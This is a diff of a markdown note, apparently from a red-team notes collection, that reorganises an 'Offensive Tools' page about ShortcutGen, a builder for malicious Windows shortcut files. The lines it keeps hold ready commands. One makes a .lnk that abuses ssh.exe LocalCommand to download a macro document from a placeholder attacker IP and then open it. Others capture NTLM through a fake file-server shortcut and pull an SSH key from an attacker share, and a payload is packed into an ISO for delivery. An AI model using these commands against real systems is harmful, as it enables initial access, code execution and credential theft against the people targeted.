@@ -1,10 +1,8 @@
 # Offensive Tools
 
-## 01 - Scripts
+## 01 - [[ShortcutGen|ShortcutGen]]
 
-### 1.1 - [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Linux/Offensive Tools|ShortcutGen]]
-
-#### 1.1.1 - Reverse Shell
+### 1.1 - Reverse Shell
 
 > [!INFO]
 > After selecting the custom icon ensure to append the suffix with `,0`. This will make PowerShell to treat it as a string instead of a file.
@@ -27,13 +25,13 @@ $ packmypayload --out-format iso /tmp/payloads/ Patches.iso
 $ rm archive.zip
 ```
 
-#### 1.1.2 - SSH File Transfer via Office Macro
+### 1.2 - SSH File Transfer via Office Macro
 
 ```
 $ shortcutgen -p lnk -c "C:\Windows\System32\OpenSSH\ssh.exe" -a "-o \"PermitLocalCommand=yes\" -o \"LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc\" <username>@<attacker_IP>" payload.lnk
 ```
 
-#### 1.1.3 - Capture NTLM Relay
+### 1.3 - Capture NTLM Relay
 
 ```
 $ shortcutgen -p lnk -i "FILESERVER" -s "Documents" -n "document.docx" -d "A hosting server." -o fileserver.lnk
@@ -51,7 +49,9 @@ SSH Key.
 $ shortcutgen -p lnk -c "C:\Windows\System32\OpenSSH\ssh.exe" -a "-i \\<attacker_IP>\key.pem root@<IP>" --icon "C:\Windows\System32\msi.dll,0" -o payload.lnk
 ```
 
-### 1.2 - PowerShell
+## 02 - PowerShell
+
+TODO: Re-organize it somewhere
 
 ```powershell
 $ErrorActionPreference = "Stop" # Halt on any error
